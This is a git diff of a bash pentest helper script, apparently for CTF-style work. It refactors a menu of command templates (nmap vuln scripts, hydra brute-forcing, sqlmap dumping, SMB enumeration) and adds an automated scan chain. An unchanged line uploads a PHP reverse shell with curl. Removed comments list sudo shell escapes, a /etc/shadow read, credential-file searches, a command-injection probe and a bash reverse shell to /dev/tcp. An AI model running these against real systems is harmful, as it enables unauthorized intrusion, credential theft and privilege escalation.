@@ -10,7 +10,7 @@ if [ -z "$T" ]; then
   T="127.0.0.1"
 fi
 
-devices=("tun0" "eth0" "ens33" "eth1")
+devices=("tun0" "eth0" "ens33" "eth1" "wg-mullvad" "wlp61s0")
 for device in "${devices[@]}"; do
   myip=$(ifconfig $device | awk '/inet / {print $2}')
   if [[ "$myip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
@@ -46,6 +46,45 @@ clear
   else
     :
   fi
+
+rustscan="rustscan -g -a $T | cut -f 2 -d '[' | cut -f 1 -d ']'"
+nmap1="nmap -sC -sV $T -p 80,443,9090"
+nmap2="nmap -vv -Pn -A -sC -sS -T 4 -p- $T"
+nmap3="nmap -v -sS -A -T4 $T"
+nmap4="nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 $T"
+nmap5="nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $T"
+nmap6="nmap -sV -Pn -vv $T -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122"
+wfuzz="wfuzz -v -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -Z -H \"Host: FUZZ.$site\" http://$site"
+whatweb="whatweb $T"
+httpx="/usr/local/bin/httpx -status-code -title -tech-detect $T -p 8080,443,80,9999 2>&1"
+dirsearch="dirsearch -u $T -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -x 404 --exit-on-error -t 20 --cookie=$cookie --exclude-subdirs=js,css"
+host="python3 -m http.server 80"
+wpscan="wpscan --url http://$T --enumerate u,vp,vt"
+sqlmap="sqlmap -u \"https://$T/index.php?m=Index\" --level 5 --risk 3 --dump"
+smbclient="smbclient -L //$T -U \"\""
+smbmap="smbmap -H $T"
+showmount="showmount -e $T"
+ifshowmount="#If showmount works"
+mount="mount $T:/vol/share /mnt/nfs  -nolock"
+smbget="smbget -R smb://$T/anonymous"
+nmblookup="nmblookup -A $T"
+hydraftp="hydra -l root -P passwords.txt -t 32 $T ftp"
+hydramysql="hydra -L usernames.txt -P pass.txt $T mysql"
+hydrardp="hydra -V -f -L usernames.txt -P /usr/share/wordlists/rockyou.txt rdp://$T"
+hydrasmb="hydra -l Administrator -P words.txt $T smb -t 1"
+hydrasmtp="hydra -l root -P /usr/share/wordlists/rockyou.txt $T smtp -V"
+hydrassh="hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 $T ssh"
+hydratelnet="hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 $T telnet"
+hydravnc="hydra -L /root/Desktop/usernames.txt –P /root/Desktop/pass.txt -s <PORT> $T vnc"
+netcat="nc -lvnp 1234"
+wget="wget -m ftp://anonymous:anonymous@$T"
+nmapftp="nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $T"
+dig="dig $T"
+dnsrecon="dnsrecon -d $T -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml"
+snmpget="snmpget -v 1 -c public $T"
+snmpwalk="snmpwalk -v 1 -c public $T"
+snmpbulkwalk="snmpbulkwalk -v2c -c public -Cn0 -Cr10 $T"
+nmapfromrustscan="nmap -sC -sV $T -p"
 
 function menu {
   clear
@@ -100,13 +139,6 @@ function menu {
       read -p "Enter Your IP to use (Current IP: $myip): " "myip"
       ;;
     1)
-      rustscan="rustscan -g -a $T | cut -f 2 -d '[' | cut -f 1 -d ']'"
-      nmap1="nmap -sC -sV $T -p 80,443,9090"
-      nmap2="nmap -vv -Pn -A -sC -sS -T 4 -p- $T"
-      nmap3="nmap -v -sS -A -T4 $T"
-      nmap4="nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 $T"
-      nmap5="nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $T"
-      nmap6="nmap -sV -Pn -vv $T -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122"
       echo -e "\033[34mRustscan can be used for quick port scanning\033[0m"
       echo "(rustscan) $rustscan"
       echo -e "\033[34mThen we can pipe it into nmap with the ports we found for futher information where the ports are what we found from rustscan\033[0m"
@@ -126,29 +158,23 @@ function menu {
       echo "(nmap6) $nmap6"
       ;;
     2)
-      wfuzz="wfuzz -v -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -Z -H \"Host: FUZZ.$site\" http://$site"
       echo -e "\033[34mWe can use wfuzz to try and find subdomains if we have found a domain name or vhost such as website.com\033[0m"
       echo "(wfuzz) $wfuzz"
       ;;
     3)
-      whatweb="whatweb $T"
-      httpx="/usr/local/bin/httpx -status-code -title -tech-detect $T -p 8080,443,80,9999 2>&1"
       echo -e "\033[34mWe can use whatweb or httpx to check what a subdomain, subfolder or domain is hosting including version numbers\033[0m"
       echo "(whatweb) $whatweb"
       echo "(httpx) $httpx"
       ;;
     4)
-      dirsearch="dirsearch -u $T -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -x 404 --exit-on-error -t 20 --cookie=$cookie --exclude-subdirs=js,css"
       echo -e "\033[34mIf you have logged into the site, make sure to run it with cookies using --cookies= to possible find more results\033[0m"
       echo "(dirsearch) $dirsearch"
       ;;
     5)
-      host="python3 -m http.server 80"
       echo -e "\033[34mTo host a local folder make sure you are in that folder within the terminal you run this command\033[0m"
       echo "(host) $host"
       ;;
     6)
-      wpscan="wpscan --url http://$T --enumerate u,vp,vt"
       echo -e "\033[34mWordpress scanning is easy, if you have an API key from wpscan.com use the api-token parameter --api-token=\033[0m"
       echo "(wpscan) $wpscan"
       ;;
@@ -157,19 +183,11 @@ function menu {
       echo "/robots.txt /crossdomain.xml /clientaccesspolicy.xml /phpinfo.php /sitemap.xml /.git"
       ;;
     8)
-      sqlmap="sqlmap -u \"https://$T/index.php?m=Index\" --level 5 --risk 3 --dump"
       echo -e "\033[34mIf you find fields that look like they might be injected with post data in the URL - also check for post data in burp\033[0m"
       echo "(sqlmap) $sqlmap"
       ;;
     9)
       echo -e "\033[34mCommon SMB commands\033[0m"
-      smbclient="smbclient -L //$T -U \"\""
-      smbmap="smbmap -H $T"
-      showmount="showmount -e $T"
-      ifshowmount="#If showmount works"
-      mount="mount $T:/vol/share /mnt/nfs  -nolock"
-      smbget="smbget -R smb://$T/anonymous"
-      nmblookup="nmblookup -A $T"
       echo "(smbclient) $smbclient"
       echo "(smbmap) $smbmap"
       echo "(showmount) $showmount"
@@ -179,14 +197,6 @@ function menu {
       echo "(nmblookup) $nmblookup"
       ;;
     10)
-      hydraftp="hydra -l root -P passwords.txt -t 32 $T ftp"
-      hydramysql="hydra -L usernames.txt -P pass.txt $T mysql"
-      hydrardp="hydra -V -f -L usernames.txt -P /usr/share/wordlists/rockyou.txt rdp://$T"
-      hydrasmb="hydra -l Administrator -P words.txt $T smb -t 1"
-      hydrasmtp="hydra -l root -P /usr/share/wordlists/rockyou.txt $T smtp -V"
-      hydrassh="hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 $T ssh"
-      hydratelnet="hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 $T telnet"
-      hydravnc="hydra -L /root/Desktop/usernames.txt –P /root/Desktop/pass.txt -s <PORT> $T vnc"
       echo -e "\033[34mCommon hydra commands\033[0m"
       echo "(hydraftp) $hydraftp"
       echo "(hydramysql) $hydramysql"
@@ -197,7 +207,6 @@ function menu {
       echo "(hydravnc) $hydravnc"
       ;;
     11)
-      netcat="nc -lvnp 1234"
       echo -e "\033[34mNetcat is helpful\033[0m"
       echo "(netcat) $netcat"
       ;;
@@ -218,14 +227,11 @@ function menu {
       echo "ssh -i id_rsa username@$T -p 22"
       ;;
     14)
-      wget="wget -m ftp://anonymous:anonymous@$T"
-      nmapftp="nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $T"
       echo -e "\033[34mFTP Stuff\033[0m"
       echo "(wget) $wget"
       echo "(nmapftp) $nmapftp"
       ;;
     15)
-      dig="dig $T"
       echo -e "\033[34mDig for DNS stuff\033[0m"
       echo "(dig) $dig"
       ;;
@@ -285,7 +291,6 @@ function menu {
       echo "curl --upload-file phpreverseshell/php-reverse-shell.php --url http://$T/test/shell.php --http1.0"
       ;;
     18)
-      dnsrecon="dnsrecon -d $T -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml"
       echo -e "\033[34mDNS Zone Transfers\033[0m"
       echo "(dnsrecon) $dnsrecon"
       ;;
@@ -314,9 +319,6 @@ function menu {
       ;;
     99)
       echo -e "\033[34mEnumerating SNMP\033[0m"
-      snmpget="snmpget -v 1 -c public $T"
-      snmpwalk="snmpwalk -v 1 -c public $T"
-      snmpbulkwalk="snmpbulkwalk -v2c -c public -Cn0 -Cr10 $T"
       echo "(snmpget) $snmpget"
       echo "(snmpwalk) $snmpwalk"
       echo "(snmpbulkwalk) $snmpbulkwalk"
@@ -343,6 +345,7 @@ function menu {
     1337)
       echo "You found the secret checklist menu!"
       echo "This is still a work in progress. Stay tuned."
+      echo "(auto) Type auto to start auto-hacker process"
       ;;
     *)
       echo -e "\033[31mInvalid option. Please try again.\033[0m"
@@ -467,21 +470,23 @@ while true; do
   elif [ "$input" == "snmpbulkwalk" ]; then
     gnome-terminal -- bash -c "echo 'running $snmpbulkwalk'; $snmpbulkwalk; bash"
     continue
+  elif [ "$input" == "auto" ]; then
+    clear
+    echo "AUTO HACKER PROCESS WARMING UP..."
+    #This is a meme, ignore it.
+    sleep 1s
+    echo "Setting Rustscan ports as a variable"
+    rustscantoports=$(rustscan -g -a $T | cut -f 2 -d [ | cut -f 1 -d ])
+    echo "Running nmap against the found ports"
+    gnome-terminal --maximize -t "Nmap scan" -- bash -c "echo 'running $nmap1 against rustscan ports'; $nmapfromrustscan $rustscantoports -Pn; bash"
+    IFS=',' read -ra ports <<< "$rustscantoports"
+    for port in "${ports[@]}"; do
+      echo "$T:$port" >> tmp
+    done
+    echo "Checking httpx/cms for each port on the IP"
+    gnome-terminal --tab -t "Site Software HTTPX" -- bash -c "echo 'running $httpx against ports found'; httpx -status-code -title -tech-detect -list tmp 2>&1; bash"
+    echo "Running directory scans against each webserver found"
+    gnome-terminal --tab -t "Site Software WhatWeb" -- bash -c "whatweb --input-file=tmp; rm tmp; bash"
+    continue
   fi
 done
-
-#Commands to add
-#find / -name id_rsa 2> /dev/null
-#find / -name authorized_keys 2> /dev/null
-#cat ~/.bash_history
-#a. sudo find /bin -name nano -exec /bin/sh \;
-#b. sudo awk 'BEGIN {system("/bin/sh")}'
-#c. echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
-#d. sudo vim -c '!sh'
-#e. sudo apache2 -f /etc/shadow
-#find / -type f -perm -04000 -ls 2>/dev/null
-#strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
-#getcap -r / 2>/dev/null
-#gobuster  dir --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -u http://<ip>:8081/ -x php,txt,html,sh,cgi
-#Test api endpoints for breakouts: /ping?ip=google.com | `ls`
-#bash -i >& /dev/tcp/$myip/4444 0>&1
